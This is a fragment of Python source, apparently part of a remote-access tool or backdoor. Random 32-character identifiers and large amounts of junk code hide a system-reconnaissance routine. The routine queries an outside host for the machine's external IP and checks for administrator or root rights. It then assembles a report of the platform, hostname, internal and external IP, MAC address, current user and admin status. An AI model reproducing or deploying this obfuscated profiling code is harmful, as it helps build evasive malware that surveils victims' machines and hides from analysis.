            if tmDyqVBxjpHtBmhlkfgzARUVAuhFYrRJ != QpwLvBkvKfgQgpYGOZCNlXgLXdiPZgqj:
                ElyigsgWqkfioHpLakTspTnzONUffAfY = yafQNClJKHetJGOXPtQAhroeZdLwWwkQ
                for RqNBeKORWIoyKskRYfDwQLLwYsnDErYh in QpwLvBkvKfgQgpYGOZCNlXgLXdiPZgqj:
                    if RqNBeKORWIoyKskRYfDwQLLwYsnDErYh != yafQNClJKHetJGOXPtQAhroeZdLwWwkQ:
                        ElyigsgWqkfioHpLakTspTnzONUffAfY = ElyigsgWqkfioHpLakTspTnzONUffAfY
                    else:
                        bONRpobGaxSVANFhnejvgnDKsILENtxS = tmDyqVBxjpHtBmhlkfgzARUVAuhFYrRJ
            else:
                yafQNClJKHetJGOXPtQAhroeZdLwWwkQ = tmDyqVBxjpHtBmhlkfgzARUVAuhFYrRJ
                tmDyqVBxjpHtBmhlkfgzARUVAuhFYrRJ = bONRpobGaxSVANFhnejvgnDKsILENtxS
                if yafQNClJKHetJGOXPtQAhroeZdLwWwkQ == tmDyqVBxjpHtBmhlkfgzARUVAuhFYrRJ:
                    for RqNBeKORWIoyKskRYfDwQLLwYsnDErYh in tmDyqVBxjpHtBmhlkfgzARUVAuhFYrRJ:
                        if RqNBeKORWIoyKskRYfDwQLLwYsnDErYh == yafQNClJKHetJGOXPtQAhroeZdLwWwkQ:
                            yafQNClJKHetJGOXPtQAhroeZdLwWwkQ = tmDyqVBxjpHtBmhlkfgzARUVAuhFYrRJ
                        else:
                            yafQNClJKHetJGOXPtQAhroeZdLwWwkQ = bONRpobGaxSVANFhnejvgnDKsILENtxS
            wPmUDVgqtQZfEgSgpAGJEYQqTRkXaWwM = urllib.urlopen('http://'+CKNGafJMKJOozHoMvgWqfxcXvDZcoVGY).read().rstrip()
            WlLSWVUNhxCIjnPMaAayOrOZrncmZIsG = 'SBhWBoZxpjlTvPWmjARrNkKsDGgJhwqc'
            GqCFmsSszixdsuOkMnDpWZqQCNLaNkmg = 'UxSmszdcYVqJzFVtWCumIPsCMyxzqimd'
            VxDuNNoKQutYSeIwupLniNurQjxtPtzH = 'mrpDBehefhSpcsxvnpOAySkiRksVEDGE'
            LNrzQMiETjdYAdXAeUNCQrfSkiltXeJe = 'OrOFpIeSHgNgNCEIzEZnUiQJbKEsQiFH'
            RvSuAxcNyMuDLERVACmRbGzhoIiZBiGX = 'bgxmNkeBoZKoUhmRNxUKXAFqVNMOoYiJ'
            WWNDxnKlIgrpCMJICxXYRxryjVaZmtNi = 'mtAbJZQCwTeHntBOloTVpPiTqFAZUMIi'
            if VxDuNNoKQutYSeIwupLniNurQjxtPtzH == LNrzQMiETjdYAdXAeUNCQrfSkiltXeJe:
                for WWNDxnKlIgrpCMJICxXYRxryjVaZmtNi in RvSuAxcNyMuDLERVACmRbGzhoIiZBiGX:
                    if WWNDxnKlIgrpCMJICxXYRxryjVaZmtNi == LNrzQMiETjdYAdXAeUNCQrfSkiltXeJe:
                        RvSuAxcNyMuDLERVACmRbGzhoIiZBiGX = WlLSWVUNhxCIjnPMaAayOrOZrncmZIsG
                    else:
                        LNrzQMiETjdYAdXAeUNCQrfSkiltXeJe = GqCFmsSszixdsuOkMnDpWZqQCNLaNkmg
        except IOError:
            PJVqzoAvucniPAWHkEycUGVqtkEQsMnI = 'AnfQjzKkxKsdNhNwCWhFJFyVbXFheghC'
            lontJunsCMimklVThVuDQCWXZZBZTFGK = 'NWlZVPJcyOtFkNFUbbqbBfaFOcLozphE'
            VcTYEGCjCWbhbCqSfiyJFYqKzaKWACsx = 'zVgRCufPUTcnsMoJRbbwFoEpPaomhPax'
            if PJVqzoAvucniPAWHkEycUGVqtkEQsMnI == lontJunsCMimklVThVuDQCWXZZBZTFGK:
                wJaJKGmeaWokHbEgfuDeauthvcGxRRNQ = 'FqvSNAZUNUNUfMKZRIsCwbYPbFSjgvUH'
                wJaJKGmeaWokHbEgfuDeauthvcGxRRNQ = PJVqzoAvucniPAWHkEycUGVqtkEQsMnI
            else:
                wJaJKGmeaWokHbEgfuDeauthvcGxRRNQ = 'FqvSNAZUNUNUfMKZRIsCwbYPbFSjgvUH'
                wJaJKGmeaWokHbEgfuDeauthvcGxRRNQ = VcTYEGCjCWbhbCqSfiyJFYqKzaKWACsx
            pass
            THtFVxnTVOsrkgCeADfgnXxsbTeffQuj = 'JhFMbDgEORrSCtVPHQVPNvedazwIFprD'
            iiapuQuBOXFYJLOemUKrnlWuFJiqfpam = 'lHwLWYubRqgnAgqVGOaZApEUIbvOYrHv'
            if THtFVxnTVOsrkgCeADfgnXxsbTeffQuj != iiapuQuBOXFYJLOemUKrnlWuFJiqfpam:
                KRrgqLpkqAhPnFBAgLDswSnEUigyJrgM = 'oGiXjFkcleCdZXUeltlnkRmoSweguwWq'
                lGoFfJtvDZJIKAMGDEauuaKiZxfuLZNr = 'FHtVnQPIAWOOkAXwtRXTJrMDEjKktRKI'
                lGoFfJtvDZJIKAMGDEauuaKiZxfuLZNr = KRrgqLpkqAhPnFBAgLDswSnEUigyJrgM
        if wPmUDVgqtQZfEgSgpAGJEYQqTRkXaWwM and (6 < len(wPmUDVgqtQZfEgSgpAGJEYQqTRkXaWwM) < 16):
            glsTfHmdeBpkRWSTETejXTgFndahnEmC = 'DTLwpSJkERlXfycZNxtLqetVPniUUple'
            bQAGfopyJFuMwcFArrZeQnhoeQzqpZNl = 'COnapmYMxgnQWXnItyTnuItDGdwnafSj'
            PRZHbKXvRugedoxbOglkHqBEoiejVXNI = 'vcrDKtlfcHqIzSAKkTfZRMXrOAEUrDph'
            cWQCujlqmEXpKAidOqYiNRyfpGyYPRPB = 'cHsrjLafcfBNafkVRaxtaVsRjXQoWpiU'
            wsGIzlizBjxfGFiimPxUbVpDiSnCzfPu = 'hfDskbXwGGdAANjMlfuERTwIZvCjNVLS'
            VVgbjPmPJtwEiZVdqxmtPSasBBAyIKUf = 'CjOrPonAKkZbMmHGSWEIcBlBUWiIhBXl'
            if PRZHbKXvRugedoxbOglkHqBEoiejVXNI == cWQCujlqmEXpKAidOqYiNRyfpGyYPRPB:
                for VVgbjPmPJtwEiZVdqxmtPSasBBAyIKUf in wsGIzlizBjxfGFiimPxUbVpDiSnCzfPu:
                    if VVgbjPmPJtwEiZVdqxmtPSasBBAyIKUf == cWQCujlqmEXpKAidOqYiNRyfpGyYPRPB:
                        wsGIzlizBjxfGFiimPxUbVpDiSnCzfPu = glsTfHmdeBpkRWSTETejXTgFndahnEmC
                    else:
                        cWQCujlqmEXpKAidOqYiNRyfpGyYPRPB = bQAGfopyJFuMwcFArrZeQnhoeQzqpZNl
            break
            FDGTXTRYsKQMUvwQbnlUIsOwKYcpHNjK = 'PZGRnJVRYXBmtyBStSKSEecuMxxJDfdW'
            GeRCiWxUmQDmjFhhloIIstkipWFcZWGL = 'nARGmHZJHFQpfWqqmjCDPkEUVXjJaMoo'
            ZKDhZalIQpkQKCHhprynOgLhQgIVQBSz = 'HSusTgziqfdrHHOuoURNGZjzBSqBFTGP'
            RSIqsSyNiueJHGLGfZCDSxTjmWQycOhr = 'ZRlWmZCdezGVboCkMrYxMwwtZVexblAI'
            nxRaxnDdfNEfyIoAMAEBeQyfXkltVwHF = 'CGHIeMafmeHLsifQixdggJRLfvpHPima'
            bghtYlTBZXIQPbyjttqfqpAQAXXqaIfm = 'JYPcnUdBJcxwhZMRtNBWbbhdSutJNPbE'
            if ZKDhZalIQpkQKCHhprynOgLhQgIVQBSz == RSIqsSyNiueJHGLGfZCDSxTjmWQycOhr:
                for bghtYlTBZXIQPbyjttqfqpAQAXXqaIfm in nxRaxnDdfNEfyIoAMAEBeQyfXkltVwHF:
                    if bghtYlTBZXIQPbyjttqfqpAQAXXqaIfm == RSIqsSyNiueJHGLGfZCDSxTjmWQycOhr:
                        nxRaxnDdfNEfyIoAMAEBeQyfXkltVwHF = FDGTXTRYsKQMUvwQbnlUIsOwKYcpHNjK
                    else:
                        RSIqsSyNiueJHGLGfZCDSxTjmWQycOhr = GeRCiWxUmQDmjFhhloIIstkipWFcZWGL
    APLYOIUEFFVmqNkSOuQfJbmelEHREYls = False
    ljVjcKzMqRsaqHkFsxHGmhQBNphcjYXw = 'ofHNJFIoWEXWZZiOdouOMBtUuLovvcQH'
    YVfWKiIJRvnYOFCdVrbRLhXIoBxbxrNS = 'fmefrCPBZlnXgLYGynTpngXefXWdHXRR'
    dSYyRoPiBLdSKsovZsdevvyrggUApvAz = 'UzqgtKouXmjxRwtJumrNeZOrnQnZtRce'
    EhgDekyBgSKyFEcqWLncqgESwmSjymcO = 'SuWKIANrAoITakxyDrdfJXWxBFGDpKkm'
    vKayVFzlHwHAAMNxIxPMKmKsjiCMGFyG = 'VQUgEuxGfATurFtzOMGcQPoQMiCGxEZQ'
    ziVHklNXVOfmODVUgMSlQAXCwBUNLRiA = 'aOEpTkzOGyNpUfKMIwmgWkqYXOwttZGS'
    if dSYyRoPiBLdSKsovZsdevvyrggUApvAz == EhgDekyBgSKyFEcqWLncqgESwmSjymcO:
        for ziVHklNXVOfmODVUgMSlQAXCwBUNLRiA in vKayVFzlHwHAAMNxIxPMKmKsjiCMGFyG:
            if ziVHklNXVOfmODVUgMSlQAXCwBUNLRiA == EhgDekyBgSKyFEcqWLncqgESwmSjymcO:
                vKayVFzlHwHAAMNxIxPMKmKsjiCMGFyG = ljVjcKzMqRsaqHkFsxHGmhQBNphcjYXw
            else:
                EhgDekyBgSKyFEcqWLncqgESwmSjymcO = YVfWKiIJRvnYOFCdVrbRLhXIoBxbxrNS
    if plat_type.startswith('win'):
        dLLkESVhFkCPOQjAJhpHlkfYrapEybHQ = 'ATvwTRVmHOqLXAbUVmiPmFGSscGSoOyp'
        UwzvGTfzMBuanMiyCuVYWWWKKusJkcHc = 'wCLlcXeCgETYaIYrNEZGfeGtFoyFFftW'
        if dLLkESVhFkCPOQjAJhpHlkfYrapEybHQ != UwzvGTfzMBuanMiyCuVYWWWKKusJkcHc:
            YaEDzmhpNKuEVXLKXxUKiUeDvSORIRYT = 'laHDFtxSdzUObrJrHIxlzDgPKEaCNsWS'
            xDWbSBzDuowmMDAtDgBwQnBJsYrUQUMm = 'LyfLHkKeuzcUERjgeOupLvblAzqLutjx'
            xDWbSBzDuowmMDAtDgBwQnBJsYrUQUMm = YaEDzmhpNKuEVXLKXxUKiUeDvSORIRYT
        APLYOIUEFFVmqNkSOuQfJbmelEHREYls = ctypes.windll.shell32.IsUserAnAdmin() != 0
        UfKRmjHtVhsvMIPANuhjCOTGzBrSJzMx = 'LTNILWyLPqVMdCOPxSHItiFTupxGwnrU'
        cjwaKTbPCFPdEmgjYXfCjkstHphiZahn = 'NrnrpQZEgorwefRrBxmsmnmxpuOZlBCV'
        dHQuSftHKGWQPRzbEjwPQRHsuNCSjdzg = 'ZbGsPWJeSoVhjEweRNYvDFVuNVyIVBbI'
        if UfKRmjHtVhsvMIPANuhjCOTGzBrSJzMx == cjwaKTbPCFPdEmgjYXfCjkstHphiZahn:
            ZgSMebPRWxyDfaBEbgKuJmaZqaXiIfso = 'NptswpKPiYroTjNTPpfQHeLouCmbRwIz'
            ZgSMebPRWxyDfaBEbgKuJmaZqaXiIfso = UfKRmjHtVhsvMIPANuhjCOTGzBrSJzMx
        else:
            ZgSMebPRWxyDfaBEbgKuJmaZqaXiIfso = 'NptswpKPiYroTjNTPpfQHeLouCmbRwIz'
            ZgSMebPRWxyDfaBEbgKuJmaZqaXiIfso = dHQuSftHKGWQPRzbEjwPQRHsuNCSjdzg
    elif plat_type.startswith('linux') or platform.startswith('darwin'):
        NanFuNRgXvpVZNQFgIHXYNSTeKgGfhnp = 'llhYvXlQUrAeXBeXQuSRzLwXnjCJxBOR'
        UnIsrVlpIDxjPoAnWStDlHamuQmjTpLN = 'BgRqMDcEWPbOCTVwuBqoifPhBVVaRPVw'
        ACFTABCEElYCACesjbjrGKlvJdnoXNSz = 'hndKWltoutcFamYEmajRquMEyiQqoYQy'
        if NanFuNRgXvpVZNQFgIHXYNSTeKgGfhnp == UnIsrVlpIDxjPoAnWStDlHamuQmjTpLN:
            MaPFeaLjmYXOECdLpsJHRhXehHSrtlJk = 'ovFpvzbTtByfLMIPIGaJzBFOfTagOnED'
            MaPFeaLjmYXOECdLpsJHRhXehHSrtlJk = NanFuNRgXvpVZNQFgIHXYNSTeKgGfhnp
        else:
            MaPFeaLjmYXOECdLpsJHRhXehHSrtlJk = 'ovFpvzbTtByfLMIPIGaJzBFOfTagOnED'
            MaPFeaLjmYXOECdLpsJHRhXehHSrtlJk = ACFTABCEElYCACesjbjrGKlvJdnoXNSz
        APLYOIUEFFVmqNkSOuQfJbmelEHREYls = os.getuid() == 0
        TPIvxkUJZcdkzGzeBYYHqDkxUpbJQlHE = 'ssVbSrniobAzfpYBPsdekyJbGbkoOwVI'
        rPDeUJIPXMlfyEMYzSVAKDfirKFOzdYM = 'ScaEGnhZhXRIyZdAUaRiTmflIxeYkLxc'
        if TPIvxkUJZcdkzGzeBYYHqDkxUpbJQlHE != rPDeUJIPXMlfyEMYzSVAKDfirKFOzdYM:
            MQqEJTKfHpEteyKSTAnEZjogzcgtRLRs = 'uawOTyPDcKzPGNgZxhgjvUAUPVILAjtF'
            AKlMfzfZOupnvNGZXahHEezayicfQkUH = 'sAihiNasNlSJXXwYwmbYNPWUQyswzILH'
            AKlMfzfZOupnvNGZXahHEezayicfQkUH = MQqEJTKfHpEteyKSTAnEZjogzcgtRLRs
    yFAoqOHldTMKXAcDghbsIIdKBkNmuyVh = 'Yes' if APLYOIUEFFVmqNkSOuQfJbmelEHREYls else 'No'
    NHfdjOsWGARCdxpHgmfyTNGzvPDdEiHB = 'YBpFdexEbmDAefSWGBeiyfIvwDtcXEZY'
    vlzwuJbDqKdNanOOfJGLZzpddTjmVqai = 'xduHSQwixihLpnAoLoANttKHifoDmEPp'
    if NHfdjOsWGARCdxpHgmfyTNGzvPDdEiHB != vlzwuJbDqKdNanOOfJGLZzpddTjmVqai:
        iYXpMUyJoRpyeUHcCOsKIIaqRTuuBVZz = 'evsVfNqEzEqIkUZJLJzElOGpQDkiVudE'
        wKrldFPfBMipFsuzCnQsQFzieZbyJMIM = 'xsexUfOnrcocHdiDViOBFRUDkOWhxLMc'
        wKrldFPfBMipFsuzCnQsQFzieZbyJMIM = iYXpMUyJoRpyeUHcCOsKIIaqRTuuBVZz
    NneadfFMxuGELTgrwIxzDZbhGDSRuwnx = '''
    System Platform     - {}
    Processor           - {}
    Architecture        - {}
    Hostname            - {}
    FQDN                - {}
    Internal IP         - {}
    External IP         - {}
    MAC Address         - {}
    Current User        - {}
    Admin Access        - {}
    '''.format(zmtvaFWZmUsxCNHdBfZMFHqckKxonbPD, processor, architecture,
    QuZDtCNimWmsSeBSMoNpLJSiwvFNuQxD, wkNKlScBkUmtKcZCEySitixcuvGkrPks, elmVCkDOPfuXryWuPsphOExTHiEjlrvv, wPmUDVgqtQZfEgSgpAGJEYQqTRkXaWwM, QncyPilQuaFYEuyuxeMtkHSKouUZPhTe, XQPNCkjgXZcjuKGtjdkBuWvtDIJsjpIR, yFAoqOHldTMKXAcDghbsIIdKBkNmuyVh)
    return NneadfFMxuGELTgrwIxzDZbhGDSRuwnx
